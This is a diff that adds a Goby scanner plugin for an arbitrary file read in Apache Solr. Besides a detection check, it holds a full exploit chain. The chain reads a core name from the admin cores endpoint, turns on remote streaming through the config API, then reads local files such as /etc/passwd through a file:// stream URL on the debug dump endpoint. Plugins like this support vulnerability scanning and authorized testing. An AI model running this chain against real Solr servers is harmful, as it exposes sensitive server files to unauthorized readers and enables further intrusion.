@@ -1,0 +1,155 @@
+{
+      "Name": "Apache Solr Arbitrary File Read",
+      "Level": "2",
+      "Tags": ["fileread"],
+      "GobyQuery": "app=\"Solr\"",
+      "Description": "Apache Solr has an arbitrary file read vulnerability, which allows attackers to obtain sensitive files from the target server without authorization.",
+      "Product": "Apache Solr",
+      "Homepage": "https://solr.apache.org/",
+      "Author": "PeiQi",
+      "Impact": "<p>Read any file on the server</p>",
+      "Recommandation": "<p>undefined</p>",
+      "References": [
+            "http://wiki.peiqi.tech"
+      ],
+	  "HasExp": true,
+	  "ExpParams": [
+		{
+			"name": "file",
+			"type": "createSelect",
+			"value": "/etc/passwd,\\\\127.0.0.1\\c$\\Windows\\win.ini",
+			"show": ""
+			}
+	  ],
+	  "ExpTips": {
+		"Type": "",
+		"Content": ""
+	  },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/solr/admin/cores?indexInfo=false&wt=json",
+                        "follow_redirect": true,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "responseHeader",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+	  "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/solr/admin/cores?indexInfo=false&wt=json",
+                        "follow_redirect": false,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "responseHeader",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|(?s)\"name\":\"(.*?)\","
+                  ]
+            },
+            {
+                  "Request": {
+                        "method": "POST",
+                        "set_variable":["solrCore|lastbody|regex|(?s)\"name\":\"(.*?)\","],
+                        "uri": "/solr/{{{solrCore}}}/config",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "application/json"
+                        },
+                        "data_type": "text",
+                        "data": "{\"set-property\" : {\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            },
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/solr/{{{solrCore}}}/debug/dump?param=ContentStreams",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        "data_type": "text",
+                        "data": "stream.url=file://{{{file}}}"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                  "output|lastbody|regex|(?s)\"stream\":\"(.*)\"}]"
+                  ]
+            }
+      ],
+      "PostTime": "2021-03-27 17:17:15",
+      "GobyVersion": "1.8.254"
+}
